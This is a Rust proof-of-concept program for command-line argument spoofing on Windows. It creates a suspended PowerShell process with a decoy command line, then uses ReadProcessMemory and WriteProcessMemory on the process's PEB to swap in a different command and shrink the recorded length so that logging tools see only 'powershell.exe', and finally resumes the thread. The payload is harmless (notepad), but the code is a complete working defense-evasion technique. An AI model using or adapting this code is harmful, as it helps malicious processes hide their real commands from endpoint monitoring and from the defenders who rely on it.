use std::{ffi::c_void, mem::size_of};
use windows::{
    core::{w, PWSTR, Result},
    Wdk::System::Threading::{NtQueryInformationProcess, ProcessBasicInformation},
    Win32::{
        Foundation::{CloseHandle, UNICODE_STRING}, 
        System::{
            Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory},
            Threading::{
                CreateProcessW, ResumeThread, WaitForSingleObject, 
                CREATE_NO_WINDOW, CREATE_SUSPENDED, INFINITE, PEB, 
                PROCESS_BASIC_INFORMATION, PROCESS_INFORMATION, 
                RTL_USER_PROCESS_PARAMETERS, STARTUPINFOW,
            },
        }
    }
};

/// Calculates the byte offset of a field in a struct or union at compile time.
macro_rules! offset_of {
    ($type:ty, $field:ident) => {{
        let base: *const $type = std::ptr::null();
        let field_ptr = &(*base).$field as *const _ as usize;
        field_ptr - base as usize
    }};
}

fn main() -> Result<()> {
    unsafe {
        // Command that will perform spoofing
        let mut start_argument = to_pwstr("powershell.exe args spoofing");
        let mut process_information = PROCESS_INFORMATION::default();
        let mut startup_info = STARTUPINFOW {
            cb: size_of::<STARTUPINFOW>() as u32,
            ..Default::default()
        };

        // Creating a process in suspended mode
        CreateProcessW(
            None,
            PWSTR(start_argument.as_mut_ptr()),
            None,
            None,
            false,
            CREATE_SUSPENDED | CREATE_NO_WINDOW,
            None,
            w!("C:\\Windows\\System32\\"),
            &mut startup_info,
            &mut process_information,
        )?;

        println!("[+] DONE!");
        println!("[+] Target PID Process: {}", process_information.dwProcessId);

        let h_process = process_information.hProcess;
        let h_thread = process_information.hThread;

        // Retrieving PEB address
        let mut process_basic = PROCESS_BASIC_INFORMATION::default();
        let mut return_len: u32 = 0;
        NtQueryInformationProcess(
            h_process,
            ProcessBasicInformation,
            &mut process_basic as *mut _ as *mut c_void,
            size_of::<PROCESS_BASIC_INFORMATION>() as u32,
            &mut return_len,
        );

        println!("[+] Adress to PEB: {:?}", process_basic.PebBaseAddress);

        // Reading the PEB address
        let mut peb = PEB::default();
        ReadProcessMemory(
            h_process,
            process_basic.PebBaseAddress as *const c_void,
            &mut peb as *mut _ as *mut c_void,
            size_of::<PEB>(),
            None,
        )?;

        // Reading the RTL_USER_PROCESS_PARAMETERS structure from the remote process's PEB
        let mut user_process_params = RTL_USER_PROCESS_PARAMETERS::default();
        ReadProcessMemory(
            h_process,
            peb.ProcessParameters as *const c_void,
            &mut user_process_params as *mut _ as *mut c_void,
            size_of::<RTL_USER_PROCESS_PARAMETERS>() + 255,
            None,
        )?;

        // Changing the Buffer value for the actual command
        let reajust_argument = to_pwstr("powershell.exe -NoExit notepad.exe");
        WriteProcessMemory(
            h_process,
            user_process_params.CommandLine.Buffer.as_ptr().cast(),
            reajust_argument.as_ptr().cast(),
            reajust_argument.len() * size_of::<u16>() + 1,
            None,
        )?;

        // Changing the size of CommandLine.Length
        let new_len = "powershell.exe".encode_utf16().chain(Some(0)).count() * size_of::<u16>();
        let offset = peb.ProcessParameters as usize + offset_of!(RTL_USER_PROCESS_PARAMETERS, CommandLine) + offset_of!(UNICODE_STRING, Length);
        WriteProcessMemory(
            h_process,
            offset as *const c_void,
            &new_len as *const _ as *const c_void,
            size_of::<u32>(),
            None,
        )?;

        println!("[+] Thread Executed!!");

        // Resuming the Thread for execution
        ResumeThread(h_thread);
        WaitForSingleObject(h_thread, INFINITE);

        CloseHandle(h_process)?;
        CloseHandle(h_thread)?;
    }

    Ok(())
}

/// Converts a Rust string `&str` to a UTF-16 null pointer (PWSTR).
fn to_pwstr(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(Some(0)).collect()
}
